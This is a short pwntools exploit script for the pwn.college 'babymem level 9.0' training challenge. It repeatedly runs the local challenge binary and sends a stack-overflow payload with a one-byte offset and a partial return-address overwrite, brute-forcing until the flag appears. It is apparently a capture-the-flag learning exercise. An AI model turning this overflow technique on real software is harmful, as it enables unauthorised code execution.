from pwn import *

while True:
    p = process('/challenge/babymem_level9.0')

    p.recvuntil('Payload size:')
    p.sendline(b'74')

    payload =  b'a' * 52 + p8(71) + p16(0x45af) 

    #p.recvline('Send your payload')
    p.sendline(payload)

    #p.interactive()
    str = p.recvall(1)
    if str.find(b'pwn.college{') != -1:
        print(str)
        break

